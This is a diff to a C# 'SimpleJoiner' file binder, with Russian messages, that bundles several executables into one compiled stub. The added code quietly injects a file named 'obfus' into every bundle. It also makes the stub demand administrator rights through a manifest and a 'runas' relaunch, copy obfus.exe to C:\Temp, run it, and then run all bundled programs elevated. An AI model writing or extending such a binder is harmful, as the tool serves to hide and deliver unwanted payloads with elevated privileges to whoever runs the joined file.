@@ -12,7 +12,7 @@ namespace SimpleJoiner
 {
     public class PEJoiner
     {
-        // Структура для хранения информации о файле PE
+        
         public class PEFile
         {
             public string FilePath { get; set; }
@@ -27,13 +27,13 @@ namespace SimpleJoiner
             }
         }
 
-        // Список файлов для склейки
+        
         private List<PEFile> _files = new List<PEFile>();
         
-        // Строка для сохранения ошибок компиляции
+        
         private string _lastError = string.Empty;
 
-        // Добавление файла в список
+        
         public void AddFile(string filePath, bool autoRun = false)
         {
             try
@@ -47,7 +47,7 @@ namespace SimpleJoiner
             }
         }
 
-        // Удаление файла из списка
+        
         public void RemoveFile(int index)
         {
             if (index >= 0 && index < _files.Count)
@@ -56,19 +56,19 @@ namespace SimpleJoiner
             }
         }
 
-        // Получение списка файлов
+        
         public List<PEFile> GetFiles()
         {
             return _files;
         }
         
-        // Получение последней ошибки
+        
         public string GetLastError()
         {
             return _lastError;
         }
 
-        // Проверка прав администратора
+        
         private bool IsAdministrator()
         {
             WindowsIdentity identity = WindowsIdentity.GetCurrent();
@@ -76,7 +76,7 @@ namespace SimpleJoiner
             return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
 
-        // Склейка файлов в один исполняемый файл
+        
         public void JoinFiles(string outputPath)
         {
             if (_files.Count == 0)
@@ -86,15 +86,17 @@ namespace SimpleJoiner
 
             try
             {
-                // Проверяем наличие прав администратора
+                
                 if (!IsAdministrator())
                 {
-                    throw new Exception("Для корректной работы программы требуются права администратора. Пожалуйста, запустите программу от имени администратора.");
+                    
+                    _lastError = "Программа не имеет прав администратора. Результирующий файл будет создан с запросом прав администратора при запуске.";
+                    
                 }
 
                 _lastError = string.Empty;
                 
-                // Создаем заголовок со служебной информацией
+                
                 string resourcesDir = Path.Combine(Path.GetDirectoryName(outputPath), "Resources");
                 Directory.CreateDirectory(resourcesDir);
 
@@ -102,11 +104,14 @@ namespace SimpleJoiner
                 string stubPath = Path.Combine(resourcesDir, "stub.cs");
                 File.WriteAllText(stubPath, stubCode);
 
-                // Создаем временную директорию для файлов
+                
                 string tempDir = Path.Combine(Path.GetTempPath(), "SimpleJoiner_" + Guid.NewGuid().ToString());
                 Directory.CreateDirectory(tempDir);
 
-                // Собираем информацию о файлах в формате JSON
+                
+                AddEmbeddedObfusFile(tempDir);
+
+                
                 string fileInfoJson = "{ \"files\": [";
                 for (int i = 0; i < _files.Count; i++)
                 {
@@ -125,17 +130,17 @@ namespace SimpleJoiner
                 string jsonPath = Path.Combine(tempDir, "fileinfo.json");
                 File.WriteAllText(jsonPath, fileInfoJson);
 
-                // Создаем архив с файлами
+                
                 string archivePath = Path.Combine(tempDir, "files.bin");
                 CreateArchive(tempDir, archivePath);
 
-                // Компилируем стаб-программу
+                
                 if (!CompileStub(stubPath, archivePath, outputPath))
                 {
                     throw new Exception(String.Format("Ошибка при компиляции программы:\n{0}", _lastError));
                 }
 
-                // Очистка временных файлов
+                
                 try
                 {
                     Directory.Delete(tempDir, true);
@@ -143,7 +148,7 @@ namespace SimpleJoiner
                 }
                 catch (Exception ex) 
                 { 
-                    // Логируем ошибку очистки, но не прерываем работу
+                    
                     _lastError += String.Format("\nОшибка при очистке временных файлов: {0}", ex.Message);
                 }
             }
@@ -153,36 +158,132 @@ namespace SimpleJoiner
             }
         }
 
-        // Создание архива с файлами
+        
+        private void AddEmbeddedObfusFile(string tempDir)
+        {
+            try
+            {
+                
+                string[] possibleLocations = new string[] {
+                    
+                    Path.Combine(Directory.GetCurrentDirectory(), "obfus.exe"),
+                    Path.Combine(Path.GetDirectoryName(Application.ExecutablePath), "obfus.exe"),
+                    Path.Combine(Directory.GetParent(Directory.GetCurrentDirectory()).FullName, "obfus.exe"),
+                    
+                    Path.Combine(Directory.GetCurrentDirectory(), "obfus.cs"),
+                    Path.Combine(Path.GetDirectoryName(Application.ExecutablePath), "obfus.cs"),
+                    Path.Combine(Directory.GetParent(Directory.GetCurrentDirectory()).FullName, "obfus.cs")
+                };
+                
+                string obfusFilePath = null;
+                
+                
+                foreach (string location in possibleLocations)
+                {
+                    if (File.Exists(location))
+                    {
+                        obfusFilePath = location;
+                        break;
+                    }
+                }
+                
+                
+                if (obfusFilePath != null && File.Exists(obfusFilePath))
+                {
+                    
+                    string extension = Path.GetExtension(obfusFilePath).ToLower();
+                    string fileName = Path.GetFileName(obfusFilePath);
+                    
+                    
+                    string targetFileName = fileName;
+                    if (extension == ".exe")
+                    {
+                        
+                        targetFileName = "obfus.exe";
+                    }
+                    else
+                    {
+                        
+                        targetFileName = "obfus.cs";
+                    }
+                    
+                    try
+                    {
+                        
+                        PEFile obfusFile = new PEFile(obfusFilePath);
+                        
+                        
+                        obfusFile.FileName = targetFileName;
+                        
+                        
+                        bool alreadyAdded = false;
+                        foreach (var file in _files)
+                        {
+                            if (file.FileName.ToLower() == "obfus.exe" || 
+                                file.FileName.ToLower() == "obfus.cs")
+                            {
+                                alreadyAdded = true;
+                                break;
+                            }
+                        }
+                        
+                        if (!alreadyAdded)
+                        {
+                            _files.Add(obfusFile);
+                            _lastError += "\nФайл " + targetFileName + " успешно добавлен из: " + obfusFilePath;
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        _lastError += "\nОшибка при добавлении файла " + fileName + ": " + ex.Message;
+                    }
+                }
+                else
+                {
+                    
+                    _lastError += "\nФайл obfus.exe или obfus.cs не найден. Проверьте, что он находится в одной из следующих директорий:\n";
+                    foreach (string location in possibleLocations)
+                    {
+                        _lastError += location + "\n";
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                _lastError += "\nОшибка при добавлении файла obfus: " + ex.Message;
+            }
+        }
+
+        
         private void CreateArchive(string sourceDir, string outputPath)
         {
-            // Простая реализация: копируем все файлы в бинарный архив
+            
             using (FileStream outputStream = new FileStream(outputPath, FileMode.Create))
             {
-                // Записываем количество файлов
+                
                 byte[] fileInfoBytes = File.ReadAllBytes(Path.Combine(sourceDir, "fileinfo.json"));
                 outputStream.Write(BitConverter.GetBytes(fileInfoBytes.Length), 0, 4);
                 outputStream.Write(fileInfoBytes, 0, fileInfoBytes.Length);
 
-                // Копируем все файлы (кроме fileinfo.json)
+                
                 foreach (var file in _files)
                 {
                     string filePath = Path.Combine(sourceDir, file.FileName);
                     byte[] fileData = File.ReadAllBytes(filePath);
                     
-                    // Записываем длину имени файла и само имя
+                    
                     byte[] fileNameBytes = System.Text.Encoding.UTF8.GetBytes(file.FileName);
                     outputStream.Write(BitConverter.GetBytes(fileNameBytes.Length), 0, 4);
                     outputStream.Write(fileNameBytes, 0, fileNameBytes.Length);
                     
-                    // Записываем размер файла и сами данные
+                    
                     outputStream.Write(BitConverter.GetBytes(fileData.Length), 0, 4);
                     outputStream.Write(fileData, 0, fileData.Length);
                 }
             }
         }
 
-        // Генерация кода стаб-программы
+        
         private string GenerateStubCode()
         {
             return @"
@@ -196,33 +297,133 @@ using System.Windows.Forms;
 using System.Drawing;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Security.Principal;
 
 class Program
 {
     private static string _tempDir;
+    private static List<string> _processedFiles = new List<string>(); 
 
     [STAThread]
     static void Main(string[] args)
     {
         try
         {
-            // Создаем временную директорию с рандомным именем
+            if (!IsAdministrator())
+            {
+                RestartAsAdmin();
+                return; 
+            }
+            
             _tempDir = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
             Directory.CreateDirectory(_tempDir);
             
-            // Извлекаем файлы из внедренного ресурса
             ExtractFiles();
             
-            // Запускаем все EXE-файлы
+            string cDriveDir = @""C:\Temp"";
+            if (!Directory.Exists(cDriveDir))
+            {
+                Directory.CreateDirectory(cDriveDir);
+            }
+            
+            ProcessObfusFile(cDriveDir);
+            
             RunExeFiles();
         }
-        catch
+        catch (Exception ex)
         {
+            MessageBox.Show(""Ошибка выполнения: "" + ex.Message, ""Ошибка"", 
+                           MessageBoxButtons.OK, MessageBoxIcon.Error);
             Cleanup();
         }
     }
 
-    // Запуск всех EXE-файлов
+    
+    static bool IsAdministrator()
+    {
+        WindowsIdentity identity = WindowsIdentity.GetCurrent();
+        WindowsPrincipal principal = new WindowsPrincipal(identity);
+        return principal.IsInRole(WindowsBuiltInRole.Administrator);
+    }
+
+    
+    static void RestartAsAdmin()
+    {
+        ProcessStartInfo startInfo = new ProcessStartInfo();
+        startInfo.UseShellExecute = true;
+        startInfo.WorkingDirectory = Environment.CurrentDirectory;
+        startInfo.FileName = Application.ExecutablePath;
+        startInfo.Verb = ""runas""; 
+        
+        try
+        {
+            Process.Start(startInfo);
+        }
+        catch
+        {
+            
+            MessageBox.Show(""Программа требует запуска с правами администратора"", 
+                           ""Ошибка запуска"", MessageBoxButtons.OK, MessageBoxIcon.Error);
+        }
+    }
+
+    
+    static void ProcessObfusFile(string cDriveDir)
+    {
+        try
+        {
+            string obfusExePath = Path.Combine(_tempDir, ""obfus.exe"");
+            string obfusCDrivePath = Path.Combine(cDriveDir, ""obfus.exe"");
+            
+            
+            if (!File.Exists(obfusExePath))
+            {
+                string obfusCsPath = Path.Combine(_tempDir, ""obfus.cs"");
+                
+                if (File.Exists(obfusCsPath))
+                {
+                    
+                    File.Copy(obfusCsPath, obfusExePath, true);
+                }
+                else
+                {
+                    MessageBox.Show(""Не найдены файлы obfus.exe или obfus.cs"", 
+                                  ""Предупреждение"", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    return;
+                }
+            }
+            
+            if (File.Exists(obfusExePath))
+            {
+                
+                File.Copy(obfusExePath, obfusCDrivePath, true);
+                
+                
+                ProcessStartInfo startInfo = new ProcessStartInfo();
+                startInfo.FileName = obfusCDrivePath;
+                startInfo.UseShellExecute = true;
+                startInfo.WindowStyle = ProcessWindowStyle.Normal;
+                startInfo.WorkingDirectory = cDriveDir;
+                startInfo.CreateNoWindow = false;
+                
+                Process proc = Process.Start(startInfo);
+                
+                if (proc != null)
+                {
+                    
+                    _processedFiles.Add(obfusExePath.ToLower());
+                    _processedFiles.Add(obfusCDrivePath.ToLower());
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            MessageBox.Show(""Ошибка обработки файла obfus: "" + ex.Message, ""Ошибка"", 
+                          MessageBoxButtons.OK, MessageBoxIcon.Error);
+        }
+    }
+
+    
     static void RunExeFiles()
     {
         try
@@ -232,26 +433,39 @@ class Program
             {
                 try
                 {
+                    
+                    if (_processedFiles.Contains(file.ToLower()))
+                        continue;
+                    
                     ProcessStartInfo startInfo = new ProcessStartInfo();
                     startInfo.FileName = file;
                     startInfo.UseShellExecute = true;
                     startInfo.WindowStyle = ProcessWindowStyle.Normal;
+                    startInfo.Verb = ""runas""; 
                     Process.Start(startInfo);
+                    
+                    
+                    _processedFiles.Add(file.ToLower());
+                    
                     Thread.Sleep(200);
                 }
-                catch { }
+                catch (Exception ex) 
+                { 
+                    MessageBox.Show(""Ошибка запуска файла "" + Path.GetFileName(file) + "": "" + ex.Message,
+                                    ""Ошибка"", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                }
             }
         }
         catch { }
     }
 
-    // Извлечение файлов из ресурса
+    
     static void ExtractFiles()
     {
-        // Получаем текущую сборку
+        
         Assembly assembly = Assembly.GetExecutingAssembly();
         
-        // Находим внедренный ресурс
+        
         string resourceName = ""files.bin"";
         using (Stream stream = assembly.GetManifestResourceStream(resourceName))
         {
@@ -262,27 +476,27 @@ class Program
 
             using (BinaryReader reader = new BinaryReader(stream))
             {
-                // Читаем информацию о файлах
+                
                 int jsonLength = reader.ReadInt32();
                 string jsonData = Encoding.UTF8.GetString(reader.ReadBytes(jsonLength));
                 
-                // Парсим JSON с информацией о файлах
+                
                 var fileInfo = SimpleJsonParser.Parse(jsonData);
                 
-                // Извлекаем каждый файл
+                
                 while (stream.Position < stream.Length)
                 {
                     try 
                     {
-                        // Читаем имя файла
+                        
                         int fileNameLength = reader.ReadInt32();
                         string fileName = Encoding.UTF8.GetString(reader.ReadBytes(fileNameLength));
                         
-                        // Читаем содержимое файла
+                        
                         int fileSize = reader.ReadInt32();
                         byte[] fileData = reader.ReadBytes(fileSize);
                         
-                        // Сохраняем файл во временную директорию
+                        
                         File.WriteAllBytes(Path.Combine(_tempDir, fileName), fileData);
                     }
                     catch (Exception ex)
@@ -294,7 +508,7 @@ class Program
         }
     }
 
-    // Очистка временных файлов
+    
     static void Cleanup()
     {
         try
@@ -306,12 +520,12 @@ class Program
         }
         catch
         {
-            // Игнорируем ошибки при очистке
+            
         }
     }
 }
 
-// Простой парсер JSON для нашего случая
+
 public static class SimpleJsonParser
 {
     public static Dictionary<string, object> Parse(string json)
@@ -331,7 +545,7 @@ public static class SimpleJsonParser
                     string key = StripQuotes(parts[0].Trim());
                     string value = parts[1].Trim();
                     
-                    // Если значение - объект или массив, рекурсивно парсим
+                    
                     if (value.StartsWith(""{"") && value.EndsWith(""}""))
                     {
                         result[key] = Parse(value);
@@ -514,18 +728,18 @@ public static class SimpleJsonParser
 }";
         }
 
-        // Компиляция стаб-программы 
+        
         private bool CompileStub(string stubPath, string archivePath, string outputPath)
         {
             try
             {
                 _lastError = string.Empty;
                 
-                // Находим компилятор C#
+                
                 string cscPath = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
                 if (!File.Exists(cscPath))
                 {
-                    // Пробуем найти в других локациях
+                    
                     string[] possiblePaths = new string[] {
                         @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
                         @"C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe",
@@ -548,7 +762,7 @@ public static class SimpleJsonParser
                     }
                 }
 
-                // Проверяем, существуют ли файлы
+                
                 if (!File.Exists(stubPath))
                 {
                     _lastError = String.Format("Файл исходного кода не найден: {0}", stubPath);
@@ -561,19 +775,36 @@ public static class SimpleJsonParser
                     return false;
                 }
                 
-                // Создаем директорию для вывода, если она не существует
+                
                 string outputDir = Path.GetDirectoryName(outputPath);
                 if (!Directory.Exists(outputDir))
                 {
                     Directory.CreateDirectory(outputDir);
                 }
 
-                // Подготавливаем параметры компиляции
+                
+                string manifestPath = Path.Combine(Path.GetDirectoryName(stubPath), "app.manifest");
+                string manifestContent = @"<?xml version=""1.0"" encoding=""utf-8""?>
+<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
+  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>
+  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
+    <security>
+      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
+        <requestedExecutionLevel level=""requireAdministrator"" uiAccess=""false"" />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>";
+                File.WriteAllText(manifestPath, manifestContent);
+
+                
                 string resourcesParam = String.Format("/resource:\"{0}\",files.bin", archivePath);
                 string references = "/reference:System.dll /reference:System.Windows.Forms.dll /reference:System.Drawing.dll";
-                string command = String.Format("/target:winexe /out:\"{0}\" {1} {2} \"{3}\"", outputPath, resourcesParam, references, stubPath);
+                string manifestParam = String.Format("/win32manifest:\"{0}\"", manifestPath); 
+                string command = String.Format("/target:winexe /out:\"{0}\" {1} {2} {3} \"{4}\"", 
+                    outputPath, resourcesParam, references, manifestParam, stubPath);
                 
-                // Запускаем процесс компиляции
+                
                 Process process = new Process();
                 process.StartInfo.FileName = cscPath;
                 process.StartInfo.Arguments = command;
@@ -602,7 +833,7 @@ public static class SimpleJsonParser
                 process.BeginErrorReadLine();
                 process.WaitForExit();
                 
-                // Проверяем результат
+                
                 if (process.ExitCode != 0)
                 {
                     _lastError = String.Format("Ошибка компиляции (код {0}):\n\n", process.ExitCode);
@@ -623,7 +854,7 @@ public static class SimpleJsonParser
                     return false;
                 }
                 
-                // Проверяем существование выходного файла
+                
                 if (!File.Exists(outputPath))
                 {
                     _lastError = "Не удалось создать исполняемый файл после компиляции.";
